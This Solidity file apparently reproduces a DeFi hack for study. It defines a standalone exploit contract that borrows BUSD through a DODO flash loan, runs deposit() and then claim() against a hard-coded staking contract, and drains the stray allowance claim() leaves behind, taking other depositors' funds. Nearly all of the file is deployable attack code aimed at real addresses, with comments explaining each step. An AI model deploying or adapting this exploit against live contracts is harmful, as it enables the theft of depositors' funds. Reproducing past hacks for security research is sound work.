// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (docs/EVM-playground-2.md
// §3 "syntheticExploit"). The original DeFiHackLabs PoC
// (test/UnverifiedContr_9ad32_exp.sol) runs the whole attack INLINE in the
// Foundry `Exploit is Test` contract (`attacker = address(this)`; the DODO
// flash-loan callback `DPPFlashLoanCall` lives directly on the test
// contract), so there is no standalone exploit contract to deploy. This file
// faithfully copies the inline attack (constants, the flash-loan kickoff, and
// the callback body) into a standalone contract with a `run()` entrypoint,
// with minimal inline interfaces (no imports) so it compiles anywhere.

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract UnverifiedContrDrain {
    address Vulncontract = 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92;
    IDPPOracle DPPOracle = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // Entrypoint — copies testExploit() verbatim (minus the vm.* logging
    // cheatcodes, which don't exist outside Foundry's test harness).
    function run() external {
        DPPOracle.flashLoan(0, 1_243_763_239_827_755_213_151_683, address(this), abi.encode(address(this)));
    }

    // The DODO flash-loan callback. This is where the actual attack on the
    // unverified staking contract happens: deposit() then claim() the same
    // amount, and drain the residual allowance claim() leaves behind.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data)
        external
    {
        BUSD.approve(address(Vulncontract), 9999 ether);
        // deposit(pid=0, amount=X) — pulls X BUSD from us into the vuln contract.
        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xe2bbb158), 0, 5_955_466_788_004_705_247_296));
        // claim(pid=0, amount=X) — pays X back via transfer() AND leaves us a
        // stray approve(us, X) allowance over the vuln contract's own BUSD.
        address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xc3490263), 0, 5_955_466_788_004_705_247_296));

        // Drain the residual allowance claim() left behind — this is the
        // second, unintended refund that steals other depositors' BUSD.
        BUSD.transferFrom(address(Vulncontract), address(this), 5_955_466_788_004_705_247_296);

        BUSD.transfer(address(msg.sender), quoteAmount);
    }

    receive() external payable {}
}
